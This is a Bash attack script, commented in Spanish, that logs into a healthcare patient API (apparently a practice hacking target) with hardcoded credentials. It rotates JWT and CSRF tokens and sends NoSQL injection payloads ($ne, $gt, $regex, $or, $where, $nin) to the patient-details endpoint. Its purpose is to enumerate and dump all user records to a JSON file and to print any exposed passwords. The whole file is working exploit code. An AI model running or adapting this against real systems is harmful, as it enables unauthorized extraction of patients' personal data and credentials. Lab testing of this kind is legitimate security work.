#!/bin/bash

# =============================================================
# NoSQL Dump Users — Enumeración de todos los usuarios vía NoSQLi
# =============================================================
# Patrón spam_appointments.sh:
#   - Login con email/password → extrae JWT + CSRF
#   - X-CSRF-Token rotativo de cada response
#   - Todas las categorías de payloads NoSQL
#   - Bucle $gt iteration si es findOne()
#   - Guarda resultados en .log
# =============================================================

URL_AUTH="https://hackapi.secops.group/api/v2/auth"
BASE_URL="https://hackapi.secops.group/api/v2/patient/Details/"

EMAIL="john46@healthcare.app"
PASS="john@123"

usage() {
  cat <<EOF
Uso: $(basename "$0") [opciones]

Opciones:
  -e EMAIL       Email para login (default: $EMAIL)
  -p PASSWORD    Password (default: $PASS)
  -h             Muestra esta ayuda
EOF
  exit 0
}

while getopts "e:p:h" opt; do
  case $opt in
    e) EMAIL="$OPTARG" ;;
    p) PASS="$OPTARG" ;;
    h) usage ;;
    *) usage ;;
  esac
done

# === JWT DEL LOGIN ===
JWT_LOGIN=""
JWT_NAME=""


# ===== PAYLOADS BÁSICOS PARA NoSQL INJECTION =====

# Query string: $ne (Not Equal) - Retorna TODO excepto valores específicos
QUERY_PAYLOADS_COMPARE=(
  "user_id[\$ne]="
  "user_id[\$gt]="
  "user_id[\$regex]=."
)

# Query string: Lógica booleana
QUERY_PAYLOADS_LOGIC=(
  "\$or[0][user_id][\$ne]="
  "\$or[0][user_id][\$gt]="
  "\$where=1"
)

# Path param JSON: Inyección directa
PATH_PAYLOADS_JSON=(
  '{"$ne":null}'
  '{"$ne":""}'
  '{"$gt":""}'
  '{"$regex":".*"}'
)

# Path param Booleanos
PATH_PAYLOADS_BOOL=(
  "true"
  "1"
)

# === LOGIN ===
echo ">>> Logging in as $EMAIL ..."
login_resp=$(curl -s -i -k -X POST \
  -x http://127.0.0.1:8001 \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -H "Authorization: {{apiKey}}" \
  -H "User-Agent: PostmanRuntime/7.54.0" \
  -H "Cache-Control: no-cache" \
  -H "Connection: keep-alive" \
  --data-binary "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" \
  "$URL_AUTH")

L_JWT=$(echo "$login_resp" | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
L_CSRF=$(echo "$login_resp" | grep -i 'X-CSRF-Token:' | awk -F': ' '{print $2}' | tr -d '\r\n')

if [[ -n "$L_JWT" ]]; then
  echo "<<< Logged in. JWT=${L_JWT:0:20}... CSRF=$L_CSRF"
  JWT_LOGIN="$L_JWT"
  JWT_NAME="$EMAIL"
  CSRF="$L_CSRF"
else
  echo "[!] Login failed. Exiting."
  exit 1
fi

LOG_FILE="$(dirname "$0")/nosqli_dump_$(date +%Y%m%d_%H%M%S).log"
RESULTS_DIR="$(dirname "$0")/results_nosqli"
mkdir -p "$RESULTS_DIR"

# CSRF ya fue establecido desde el login
MAX_RETRIES=2
declare -A USER_IDS_FOUND
USER_IDS_ORDERED=()
declare -A ALL_BODIES
TOTAL_REQS=0

exec > >(tee -a "$LOG_FILE") 2>&1

echo "========================================"
echo "  NoSQLi Dump Users"
echo "  Log: $LOG_FILE"
echo "  Started: $(date)"
echo "========================================"

# === FUNCIONES ===

flush() {
  # Forza flush de stdout
  python3 -c "import sys; sys.stdout.flush()" 2>/dev/null || true
}

urlencode() {
  local string="$1"
  python3 -c "import urllib.parse; print(urllib.parse.quote('$string', safe=''))" 2>/dev/null
}

extract_csrf() {
  local resp="$1"
  echo "$resp" | grep -i 'X-CSRF-Token:' | awk -F': ' '{print $2}' | tr -d '\r\n '
}

get_fresh_csrf() {
  local jwt="$1"
  local current_csrf="$2"
  local resp=$(curl -s -i -k --max-time 5 \
    -x http://127.0.0.1:8001 \
    -H "X-CSRF-Token: $current_csrf" \
    -H "Authorization: $jwt" \
    -H "Accept: application/json" \
    -H "User-Agent: PostmanRuntime/7.54.0" \
    -H "Cache-Control: no-cache" \
    "$BASE_URL" 2>/dev/null)
  extract_csrf "$resp"
}

is_valid_json() {
  echo "$1" | python3 -c "import sys,json; json.loads(sys.stdin.read()); print('ok')" 2>/dev/null | grep -q ok
}

send_req() {
  local url="$1"
  local jwt="$2"
  local csrf_token="$3"
  local retry=0
  local resp
  local http_code
  
  while true; do
    resp=$(curl -s -i -k --max-time 8 \
      -x http://127.0.0.1:8001 \
      -H "X-CSRF-Token: $csrf_token" \
      -H "Authorization: $jwt" \
      -H "Accept: application/json" \
      -H "User-Agent: PostmanRuntime/7.54.0" \
      -H "Cache-Control: no-cache" \
      -H "Connection: keep-alive" \
      "$url" 2>/dev/null)
    
    http_code=$(echo "$resp" | head -1 | awk '{print $2}')
    
    # Si 401/403 y no hemos reintentado, obtener CSRF fresco
    if [[ "$http_code" =~ ^(401|403)$ ]] && [[ $retry -lt 2 ]]; then
      echo "[!] Auth failed (HTTP $http_code), obteniendo CSRF fresco..." >&2
      csrf_token=$(get_fresh_csrf "$jwt" "$csrf_token")
      if [[ -n "$csrf_token" ]]; then
        echo "[+] CSRF renovado: ${csrf_token:0:20}..." >&2
        ((retry++))
        continue
      fi
    fi
    
    # Retornar response (sin imprimirla aquí)
    echo "$resp"
    break
  done
}


add_user() {
  local uid="$1"
  local body="$2"
  if [[ -n "$uid" ]] && [[ -z "${USER_IDS_FOUND[$uid]}" ]]; then
    USER_IDS_FOUND["$uid"]="$body"
    USER_IDS_ORDERED+=("$uid")
    echo "$body" >> "$RESULTS_DIR/users_dump.json"
    return 0
  fi
  return 1
}

process_response() {
  local resp="$1"
  local label="$2"
  local jwt_name="$3"
  local url="$4"
  local body
  local new_csrf
  local http_code

  http_code=$(echo "$resp" | head -1 | awk '{print $2}')
  new_csrf=$(extract_csrf "$resp")
  [[ -n "$new_csrf" ]] && CSRF="$new_csrf"

  body=$(echo "$resp" | awk 'BEGIN{p=0} /^$/{p=1; next} p{print}')

  echo ""
  echo "========================================"
  echo "  [$jwt_name][$label]"
  echo "  URL: $url"
  echo "  HTTP: $http_code"
  echo "========================================"

  if [[ -z "$body" ]]; then
    echo "  RESPONSE: (empty/timeout)"
    echo "========================================"
  elif is_valid_json "$body"; then
    echo "  RESPONSE (JSON):"
    echo "$body" | python3 -m json.tool 2>/dev/null || echo "$body"
    echo "========================================"

    echo "$(date +%H:%M:%S) | $jwt_name | $label | HTTP $http_code | $body" >> "$RESULTS_DIR/responses.log"

    # Extraer user_ids (soporta array de objetos y objeto único)
    local new_users=0
    while IFS= read -r uid; do
      if [[ -n "$uid" ]] && add_user "$uid" "$body"; then
        echo "  >>> NUEVO USER: $uid"
        ((new_users++))
      fi
    done < <(echo "$body" | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    if isinstance(d, list):
        for item in d:
            uid = item.get('user_id','') or item.get('id','') or ''
            if uid: print(uid)
    elif isinstance(d, dict):
        uid = d.get('user_id','') or d.get('id','') or ''
        if uid: print(uid)
except: pass
" 2>/dev/null)

    # Detectar si es array con múltiples objetos
    local is_array
    is_array=$(echo "$body" | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    print('yes' if isinstance(d, list) else 'no')
except: print('no')
" 2>/dev/null)

    [[ "$is_array" == "yes" ]] && echo "  >>> RESPUESTA ES ARRAY (todos los usuarios)"

    # Extraer password si no es ****
    local password
    password=$(echo "$body" | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    if isinstance(d, list) and len(d)>0: d=d[0]
    pwd = d.get('password','')
    if pwd and pwd != '****': print(pwd)
except: pass
" 2>/dev/null)
    [[ -n "$password" ]] && echo "  >>> PASSWORD EXPUESTO: $password"
  else
    echo "  RESPONSE (raw):"
    echo "$body"
    echo "========================================"
  fi

  ((TOTAL_REQS++))
}


test_url() {
  local url="$1"
  local label="$2"
  local jwt_name="$3"
  local jwt="$4"
  retry=0
  while true; do
    # Renovar CSRF antes de CADA request
    local fresh_csrf=$(get_fresh_csrf "$jwt" "$CSRF")
    if [[ -n "$fresh_csrf" ]]; then
      CSRF="$fresh_csrf"
    fi
    
    resp=$(send_req "$url" "$jwt" "$CSRF")
    http_code=$(echo "$resp" | head -1 | awk '{print $2}')
    process_response "$resp" "$label" "$jwt_name" "$url"
    
    # Flush stdout para evitar buffering
    flush
    
    [[ "$http_code" == "200" || "$http_code" == "404" || "$http_code" == "401" || "$http_code" == "403" ]] && break
    ((retry++))
    [[ $retry -ge $MAX_RETRIES ]] && break
    sleep 0.5
  done
}


test_payloads_for_jwt() {
  local label_prefix="$1"

  # FASE 0: Base endpoints
  for base in "$BASE_URL" "${BASE_URL%/}/"; do
    test_url "$base" "${label_prefix}BASE" "$JWT_NAME" "$JWT_LOGIN"
  done

  # FASE 1: Query params — Comparación básica ($ne, $gt, $regex)
  for payload in "${QUERY_PAYLOADS_COMPARE[@]}"; do
    encoded=$(urlencode "$payload")
    for base in "$BASE_URL" "${BASE_URL%/}/"; do
      test_url "$base?$encoded" "${label_prefix}CMP:$payload" "$JWT_NAME" "$JWT_LOGIN"
    done
  done

  # FASE 2: Query params — Lógica booleana ($or, $where)
  for payload in "${QUERY_PAYLOADS_LOGIC[@]}"; do
    encoded=$(urlencode "$payload")
    for base in "$BASE_URL" "${BASE_URL%/}/"; do
      test_url "$base?$encoded" "${label_prefix}LOGIC:$payload" "$JWT_NAME" "$JWT_LOGIN"
    done
  done

  # FASE 3: Path param JSON
  for json_payload in "${PATH_PAYLOADS_JSON[@]}"; do
    encoded=$(urlencode "$json_payload")
    for base in "$BASE_URL" "${BASE_URL%/}/"; do
      test_url "$base/$encoded" "${label_prefix}JSON:$json_payload" "$JWT_NAME" "$JWT_LOGIN"
    done
  done

  # FASE 4: Path param Booleanos
  for bool_payload in "${PATH_PAYLOADS_BOOL[@]}"; do
    encoded=$(urlencode "$bool_payload")
    for base in "$BASE_URL" "${BASE_URL%/}/"; do
      test_url "$base/$encoded" "${label_prefix}BOOL:$bool_payload" "$JWT_NAME" "$JWT_LOGIN"
    done
  done
}



# ============================================
# MAIN
# ============================================

echo "=====[ FASE A: NoSQL Injection Tests ]====="
test_payloads_for_jwt ""

# ============================================
# FASE B: $gt iteration sobre usuarios encontrados
# ============================================
echo "=====[ FASE B: \$gt iteration ]====="
for (( idx=0; idx<${#USER_IDS_ORDERED[@]}; idx++ )); do
  uid="${USER_IDS_ORDERED[$idx]}"

  # Query param $gt
  payload="[\$gt]=$uid"
  encoded=$(urlencode "$payload")
  test_url "$BASE_URL?$encoded" "GT-ITER:$uid" "$JWT_NAME" "$JWT_LOGIN"

  # JSON path param $gt
  json_payload="{\"\$gt\":\"$uid\"}"
  encoded=$(urlencode "$json_payload")
  test_url "$BASE_URL/$encoded" "GT-PATH:$uid" "$JWT_NAME" "$JWT_LOGIN"
done

# ============================================
# FASE C: \$nin expansivo (excluir encontrados)
# ============================================
echo "=====[ FASE C: \$nin expansivo ]====="
if [[ ${#USER_IDS_ORDERED[@]} -gt 0 ]]; then
  nin_params=""
  for uid in "${USER_IDS_ORDERED[@]}"; do
    nin_params+="[\$nin][]=$uid&"
  done
  nin_params="${nin_params%&}"
  encoded=$(urlencode "$nin_params")
  test_url "$BASE_URL?$encoded" "NIN-ALL" "$JWT_NAME" "$JWT_LOGIN"
fi

# ============================================
# REPORTE FINAL
# ============================================
echo ""
echo "========================================"
echo "  D U M P   C O M P L E T O"
echo "========================================"
echo "Total requests: $TOTAL_REQS"
echo "Usuarios encontrados: ${#USER_IDS_FOUND[@]}"
for uid in "${USER_IDS_ORDERED[@]}"; do
  echo "  - $uid"
done
echo ""
echo "Log:  $LOG_FILE"
echo "Dump: $RESULTS_DIR/users_dump.json"
echo "========================================"
